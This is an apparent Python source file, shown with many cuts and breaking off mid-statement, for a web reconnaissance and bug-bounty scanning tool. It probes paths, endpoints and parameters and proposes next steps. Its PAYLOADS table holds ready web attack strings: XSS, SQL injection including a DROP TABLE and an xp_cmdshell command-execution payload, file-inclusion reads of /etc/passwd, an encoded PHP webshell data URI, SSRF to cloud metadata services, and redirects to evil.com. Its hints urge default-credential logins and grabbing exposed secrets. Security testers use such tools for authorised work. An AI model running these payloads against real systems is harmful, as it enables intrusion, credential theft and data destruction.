...
# ── TTL Cache ─────────────────────────────────────────────────────────────────
# Thread-safe, TTL-aware. Default TTL = 600s (10 min).
...
def set_last_scan(key: str, data: dict):
    _cache.set("__last__", {"key": key, "data": data,
                             "timestamp": datetime.utcnow().isoformat() + "Z"}, ttl=3600)
...
ENDPOINT_PATHS = COMMON_PATHS + [
    "/api/v4", "/api/v5", "/api/users", "/api/user", "/api/admin",
...
COMMON_PARAMS = [
    ...
    {"name": "redirect", "risk": "high",   "test": "Open redirect — try redirect=https://evil.com"},
    {"name": "url",      "risk": "high",   "test": "SSRF — try url=http://127.0.0.1/"},
    {"name": "next",     "risk": "high",   "test": "Open redirect — try next=//evil.com"},
    {"name": "return",   "risk": "medium", "test": "Open redirect — try return=//evil.com"},
    {"name": "callback", "risk": "high",   "test": "SSRF/redirect — inject internal URLs"},
    ...
    {"name": "token",    "risk": "high",   "test": "Auth bypass — try empty/null/admin token"},
    {"name": "key",      "risk": "high",   "test": "API key — check if leaked in response"},
    {"name": "api_key",  "risk": "high",   "test": "API key — try api_key=null or api_key=test"},
    {"name": "debug",    "risk": "medium", "test": "Debug mode — try debug=true/1"},
    {"name": "admin",    "risk": "high",   "test": "Privilege escalation — try admin=true/1"},
    {"name": "role",     "risk": "high",   "test": "Privilege escalation — try role=admin"},
]

PAYLOADS = {
    "xss": [
        {"payload": "<script>alert(1)</script>",                                     "label": "basic script tag",   "context": "html"},
        {"payload": "<img src=x onerror=alert(1)>",                                  "label": "img onerror",        "context": "html"},
        {"payload": "'\"><script>alert(document.domain)</script>",                   "label": "attr breakout",      "context": "attr"},
        {"payload": "<svg/onload=alert(1)>",                                         "label": "svg onload",         "context": "html"},
        {"payload": "javascript:alert(1)",                                           "label": "js protocol",        "context": "href"},
        {"payload": "<details open ontoggle=alert(1)>",                              "label": "details ontoggle",   "context": "html"},
        {"payload": "\"><img src=1 onerror=alert(1)>",                               "label": "quote breakout",     "context": "attr"},
        {"payload": "<iframe src=javascript:alert(1)>",                              "label": "iframe js",          "context": "html"},
        {"payload": "'-alert(1)-'",                                                  "label": "js string escape",   "context": "js"},
        {"payload": "<body onload=alert(1)>",                                        "label": "body onload",        "context": "html"},
    ...
    "sqli": [
        ...
        {"payload": "' UNION SELECT NULL--",                                         "label": "union 1col",         "context": "search"},
        {"payload": "' UNION SELECT NULL,NULL--",                                    "label": "union 2col",         "context": "search"},
        {"payload": "' AND SLEEP(5)--",                                              "label": "time-based blind",   "context": "any"},
        {"payload": "' AND 1=2 UNION SELECT table_name FROM information_schema.tables--", "label": "schema dump",  "context": "search"},
        {"payload": "1; DROP TABLE users--",                                         "label": "destructive",        "context": "any"},
        {"payload": "' AND (SELECT 1 FROM (SELECT SLEEP(5))a)--",                    "label": "nested sleep",       "context": "any"},
        {"payload": "'; EXEC xp_cmdshell('whoami')--",                               "label": "mssql rce",          "context": "mssql"},
    ],
    "lfi": [
        {"payload": "../../../etc/passwd",                                           "label": "basic traversal",    "context": "linux"},
        {"payload": "....//....//etc/passwd",                                        "label": "filter bypass",      "context": "linux"},
        {"payload": "%2e%2e%2f%2e%2e%2fetc%2fpasswd",                                "label": "url encoded",        "context": "linux"},
        {"payload": "..%252f..%252fetc%252fpasswd",                                  "label": "double encoded",     "context": "linux"},
        {"payload": "/proc/self/environ",                                            "label": "proc environ",       "context": "linux"},
        {"payload": "/etc/passwd",                                                   "label": "absolute path",      "context": "linux"},
        {"payload": "php://filter/convert.base64-encode/resource=index.php",         "label": "php wrapper",        "context": "php"},
        {"payload": "php://input",                                                   "label": "php input stream",   "context": "php"},
        {"payload": "data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7", "label": "data wrapper rce", "context": "php"},
        {"payload": "/var/log/apache2/access.log",                                   "label": "log poisoning",      "context": "linux"},
        {"payload": "C:\\Windows\\win.ini",                                          "label": "windows basic",      "context": "windows"},
        {"payload": "..\\..\\..\\Windows\\win.ini",                                  "label": "windows traversal",  "context": "windows"},
    ],
    "ssrf": [
        {"payload": "http://127.0.0.1/",                                             "label": "localhost",          "context": "any"},
        {"payload": "http://localhost/",                                             "label": "localhost dns",      "context": "any"},
        {"payload": "http://169.254.169.254/latest/meta-data/",                      "label": "aws imds",           "context": "aws"},
        {"payload": "http://metadata.google.internal/computeMetadata/v1/",           "label": "gcp metadata",       "context": "gcp"},
        {"payload": "http://100.100.100.200/latest/meta-data/",                      "label": "alibaba cloud",      "context": "alibaba"},
        ...
        {"payload": "dict://127.0.0.1:6379/info",                                   "label": "redis via dict",     "context": "internal"},
    ...
    "open_redirect": [
        ...
        {"payload": "https://evil.com",                                              "label": "absolute redirect",  "context": "redirect"},
        {"payload": "/\\evil.com",                                                   "label": "backslash bypass",   "context": "redirect"},
        {"payload": "/%2F/evil.com",                                                 "label": "encoded slash",      "context": "redirect"},
        {"payload": "javascript:alert(1)",                                           "label": "js protocol",        "context": "redirect"},
        {"payload": "https://evil.com%23@good.com",                                  "label": "fragment bypass",    "context": "redirect"},
        {"payload": "https://good.com@evil.com",                                     "label": "at-sign bypass",     "context": "redirect"},
    ],
    "idor": [
        ...
        {"payload": "../../../admin",                                                "label": "traversal in id",    "context": "id_param"},
    ],
}
...
def _probe_path(base: str, path: str, timeout: int = 4) -> dict:
...
def recon_domain(domain: str) -> dict:
    ...
    if ssl_inf.get("valid"):
        ...
        if ssl_inf.get("san"):
            summary.append(f"SAN entries: {', '.join(ssl_inf['san'][:4])} — potential subdomains.")
    ...
    if dns.get("TXT"):
        ...
        if "v=spf1" in txt_flat:
            summary.append("SPF record present — check for misconfigured 'all' directive.")
    ...
    if any("wordpress" in t.lower() or "wp-" in t.lower() for t in tech):
        next_steps.append("WordPress — check /wp-login.php, xmlrpc.php, enumerate plugins.")
    ...
    if dns.get("MX"):
        next_steps.append("Check mail server config: SPF, DKIM, DMARC for spoofing opportunities.")
    if ssl_inf.get("san"):
        next_steps.append(f"SAN reveals extra domains — recon each: {', '.join(ssl_inf['san'][:3])}.")
...
def analyze_url(url: str) -> dict:
    ...
    if lower_h.get("access-control-allow-origin") == "*":
        misconfig.append("CORS wildcard (*) — unauthenticated cross-origin reads possible.")
    if lower_h.get("access-control-allow-credentials") == "true" and \
       lower_h.get("access-control-allow-origin") == "*":
        misconfig.append("CORS: allow-credentials + wildcard origin — critical misconfiguration.")
    ...
    if not lower_h.get("x-frame-options") and not lower_h.get("content-security-policy"):
        misconfig.append("No clickjacking protection (X-Frame-Options or CSP frame-ancestors).")

    summary = []
    if len(redirect_chain) > 1:
        summary.append(f"{len(redirect_chain)-1} redirect(s): {redirect_chain[0]['url']} → {final_url}")
    if misconfig:
    ...
    for item in misconfig:
        if "CORS" in item:
            next_steps.append("Test CORS: send cross-origin request with credentials, check if data leaks.")
        if "HSTS" in item:
        ...
        if "clickjacking" in item.lower():
            next_steps.append("Build a clickjacking PoC: embed target in iframe on your server.")
...
def bb_scan(url: str) -> dict:
    ...
    for p in found_paths:
        ...
        if s == 200:
            if "env" in path:
                hints.append(f"CRITICAL: {path} accessible — may contain secrets/credentials.")
            elif "git" in path:
                hints.append(f"CRITICAL: {path} accessible — source code exposure.")
            elif any(x in path for x in ["backup", "sql", "dump"]):
                hints.append(f"HIGH: {path} accessible — download and inspect for credentials.")
            elif "admin" in path:
                hints.append(f"HIGH: {path} accessible — test default creds/auth bypass.")
            elif any(x in path for x in ["swagger", "openapi", "docs"]):
                hints.append(f"INFO: {path} — API docs exposed, enumerate all endpoints.")
            elif "graphql" in path:
                hints.append(f"INFO: {path} — test introspection: {{__schema{{types{{name}}}}}}")
            ...
            next_steps.append(f"{path} → {s}: follow redirect, check destination for auth bypass.")
        elif s == 403:
            next_steps.append(f"{path} → 403: try X-Forwarded-For: 127.0.0.1, double slash, path normalization.")
        elif s == 500:
            next_steps.append(f"{path} → 500: inspect response body for stack traces.")
        elif s == 401:
            next_steps.append(f"{path} → 401: test default credentials admin:admin, admin:password.")
    ...
    if found_paths:
        ...
        summary.append("No exposed paths found. Try deeper wordlist with ffuf/gobuster.")
...
def get_payloads(ptype: str, context: str = None) -> dict:
    ...
    usage_tips = {
        "xss":           ["Test in ?q=PAYLOAD", "Try in form inputs", "Inject in User-Agent/Referer if reflected"],
        "sqli":          ["Try in login fields", "Add to ?id=1PAYLOAD", "Use SLEEP() to confirm blind SQLi"],
        "lfi":           ["Replace ?page=PAYLOAD", "Combine with PHP wrappers on PHP sites", "Try /proc/self/environ"],
        "ssrf":          ["Inject into URL/callback/webhook fields", "Test cloud metadata endpoints", "Try dict:// and file://"],
        "open_redirect": ["Inject into redirect=/next=/return= params", "Try URL encoding", "Combine with XSS"],
        "idor":          ["Replace numeric IDs with 0, -1, null", "Try other user IDs", "Encode as UUID or base64"],
    }
...
def find_endpoints(url: str) -> dict:
    ...
    for ep in found:
        p = ep["path"]
        if any(x in p for x in ["/api", "/v1", "/v2", "/v3", "/graphql", "/openapi", "/swagger"]):
            ep["type"] = "api"
    ...
    summary = [f"Probed {len(ENDPOINT_PATHS)} paths. {len(found)} endpoint(s) found (non-404)."]
    ...
    if any(ep["type"] == "api" for ep in found):
        summary.append("API endpoints discovered — enumerate for auth issues and data exposure.")

    next_steps = []
    if any(ep["type"] == "api" for ep in found):
        next_steps.append("Enumerate API: try /api/v1/users, /api/v1/admin, fuzzing with ffuf.")
        next_steps.append("Test API endpoints for IDOR, missing auth, broken object-level auth.")
    if any(ep["type"] == "admin" for ep in found):
        next_steps.append("Admin panel found — test default credentials and auth bypass.")
    if any(ep["type"] == "sensitive" for ep in found):
        next_steps.append("Download sensitive files immediately and inspect for credentials/keys.")
    if any(ep["type"] == "monitoring" for ep in found):
        next_steps.append("Check monitoring endpoints for internal IPs, service names, and metrics.")
    next_steps.append("Run /params on discovered endpoints to find injectable parameters.")
...
def find_params(url: str) -> dict:
    ...
    results.sort(key=lambda x: (not x["interesting"], x["risk"] != "high", x["risk"] != "medium"))
...
def run_workflow(target: str) -> dict:
    ...
    # Stage 1+2: recon + analyze-url — concurrent
    ...
    # Stage 3+4+5: bb_scan + endpoints + params — concurrent
    with ThreadPoolExecutor(max_workers=3) as pool:
    ...
    smart_summary = (
        ["=== RECON ==="] + recon_data.get("smart_summary", []) +
        ["=== URL ANALYSIS ==="] + (analyze_data.get("misconfig_hints", [])[:3] or ["No misconfigurations detected."]) +
        ["=== PATH SCAN ==="] + bb_data.get("smart_summary", []) +
        ["=== ENDPOINTS ==="] + endpoints_data.get("smart_summary", []) +
        ["=== PARAMETERS ==="] + params_data.get("smart_summary", [])
    )
...
def chat_assist(question: str, scan_result: dict = None) -> dict:
    ...
    if any(w in q for w in ["test", "what should", "next step", "start", "begin", "do next"]):
        ...
        if steps:
            response = steps[:8]; sources.append("next_steps from last scan")
        else:
            response = [
        ...
        params = ctx.get("params", {}).get("interesting") or ctx.get("interesting") or []
        if params:
            response = [f"?{p['name']}= is interesting — {p['test']}" for p in params[:6]]
        else:
            response = ["No parameter data. Run /params?url=<target> first."]

    elif any(w in q for w in ["endpoint", "path", "route", "api"]):
        eps = ctx.get("endpoints", {}).get("endpoints") or ctx.get("interesting_paths") or []
        if eps:
            response = [f"{e.get('path')} -> {e.get('status')}" for e in eps[:8]]
        else:
            response = ["No endpoint data. Run /endpoints?url=<target> or /bb-scan first."]
        ...
        if summary: response += summary[:6]; sources.append("smart_summary")
        if hints:   response += hints[:4];   sources.append("misconfig_hints")
        if missing: response.append(f"Missing headers: {', '.join(missing)}")
        if not response: response = ["No scan data. Run /recon or /workflow first."]
    ...
    elif any(w in q for w in ["payload", "xss", "sqli", "sql", "lfi", "ssrf", "redirect", "idor"]):
        ptype = next((w for w in ["xss", "sqli", "lfi", "ssrf", "open_redirect", "idor"] if w in q), "xss")
        tips  = {
...
def run_workflow_express(target: str) -> dict:
    ...
    summary = recon_data.get("smart_summary", []) + (analyze_data.get("misconfig_hints", [])[:2] or [])
...
def run_workflow_bugbounty(target: str) -> dict:
    ...
    # Recommend payload types based on what was found
    recommended = []
    ...
    if any(x in tech for x in ["php", "mysql", "sql"]) or any("/login" in p for p in paths):
...
def run_workflow_subdomains(domain: str) -> dict:
    ...
    live_subs = [s["subdomain"] for s in expansion.get("subdomains", []) if s.get("live")][:5]
    ...
    for sub, r in subdomain_recons.items():
        if r.get("missing_security_headers"):
            summary.append(f"{sub}: {len(r['missing_security_headers'])} missing security header(s).")
...
def run_workflow_api(url: str) -> dict:
    ...
    api_eps = [ep for ep in endpoints_data.get("endpoints", []) if ep.get("type") == "api"]

    summary = endpoints_data.get("smart_summary", []) + params_data.get("smart_summary", [])
    next_steps = list(dict.fromkeys(
